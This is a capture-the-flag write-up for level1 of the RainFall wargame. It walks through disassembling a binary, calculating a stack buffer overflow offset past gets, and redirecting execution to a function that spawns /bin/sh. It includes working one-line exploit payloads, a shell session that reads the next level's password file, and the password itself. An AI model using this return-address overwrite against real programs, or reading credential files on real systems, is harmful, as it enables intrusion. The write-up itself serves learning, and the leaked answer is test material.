# Level1

We have a binary once again : `level1`

Running it ends up in an infinite loop or freeze, so not much to be done here..

Let‚Äôs try to disassemble it again :

First, using `readelf`

```nasm
Symbol table '.symtab' contains 69 entries:
Num:    Value  Size Type    Bind   Vis      Ndx Name
[...]
50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run
[...]
66: 08048480    23 FUNC    GLOBAL DEFAULT   13 main
[...]
```

We notice 2 functions with some content (size)

Then with `gdb`, like in level0 :

```nasm
(gdb) disas main
Dump of assembler code for function main:

0x08048481 <+1>:     mov    ebp,esp                            // ~

0x08048495 <+21>:    leave
0x08048496 <+22>:    ret
End of assembler dump.
(gdb) disas run

0x0804847f <+59>:    ret
End of assembler dump.
```

The run function contains a call to `system`, which executes the command we put in it, that‚Äôs interesting and could be our solution !
However `main` is never calling `run`‚Ä¶ The only call it makes is to `gets`.

`gets` isn‚Äôt safe as it does not limit the number of characters it reads and that can result in a buffer overflow, that‚Äôs a good thing for us !

Now we need to figure out how big our payload should be in order to overflow and to reach the run function :

<aside>
üí°

From stack overflow :

*esp is the stack pointer. ebp is for a stack frame so that when you 
enter a function, ebp can get a copy of esp at that point. Everything 
already on the stack, the return address, passed-in parameters, etc. and
 things that are global for that function (local variables) will now be a
 static distance away from the stack frame pointer for the duration of 
the function. esp is now free to wander about as the compiler desires 
and can be used when nesting to other functions (each needs to preserve 
the ebp naturally).*

</aside>

When leave is called, `ebp` is moved back to esp and `ebp` pops back to its old value, restoring the stack as it was before `main` was called. That means the old `ebp` is stored somewhere in the stack, taking up 4 space, the return address of main function is then most likely located after that value. We also know that we allocated a 80 bytes buffer on the stack, but it only starts at 0x10 (16), that means our payload needs to be :
`80 - 16 + 4 (old ebp) + 4 (return address) = 68 padding + 4 address` 

So it seems we need to fill 68 random bytes and then overwrite the return address with run‚Äôs address we got from `readelf` : `0x08048444`

This can be done easily with python, giving our payload as `stdin`, which will be read by `gets` : (note that the address is given backwards as required by x86 processors ‚Üí little endian)

```bash
python -c 'print("X" * 68 + "\x44\x84\x04\x08")' | ./level1
```

But that produces no output, no segfault as well, kinda weird.

Our size calculation seems correct but I tried some values that were close to it just in case

```bash
level1@RainFall:~$ python -c 'print("X" * 68 + "\x44\x84\x04\x08")' | ./level1
level1@RainFall:~$ python -c 'print("X" * 64 + "\x44\x84\x04\x08")' | ./level1
level1@RainFall:~$ python -c 'print("X" * 60 + "\x44\x84\x04\x08")' | ./level1
level1@RainFall:~$ python -c 'print("X" * 72 + "\x44\x84\x04\x08")' | ./level1
Illegal instruction (core dumped)
level1@RainFall:~$ python -c 'print("X" * 76 + "\x44\x84\x04\x08")' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

Something definitely happens with a payload of 80 in total, there could be two reasons for that : one is I went too far with trying to calculate where the return address should be and I just had to take the size of the buffer allocated (which was 0x50 or 80). Or, there is a padding of 8 bytes performed by the program to keep alignment to 16 bytes and that would make more sense : 

- **64 / 16 = 4**               that‚Äôs okay
- **64 + 4 (ebp) + 4 (return address) / 16 = 4.5**            that‚Äôs not okay
- **64 + 8 (padding) + 4 (ebp) + 4 (return address)**  **= 5**      that‚Äôs okay !

Anyway, now that we have a correct buffer value we have an issue : it still segfaults afterwards. 
The message we get : ‚ÄúGood‚Ä¶ Wait what?‚Äù probably comes from the call to `fwrite` in `run`. It should then call `system` with whatever is at the address `0x8048584`, let‚Äôs find out what‚Äôs there

```bash
level1@RainFall:~$ gdb -q ./level1
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
```

Alright, so that is indeed the solution to this level ! Now we just need to keep access to this shell and interact with it, and to do that we need to keep `stdin` open, otherwise the shell thinks we‚Äôre already done before we even started. One way to do that is by adding `cat` to our command : 

```bash
level1@RainFall:~$ (python -c 'print("X" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
id
uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
exit
```

And we‚Äôre finally done !
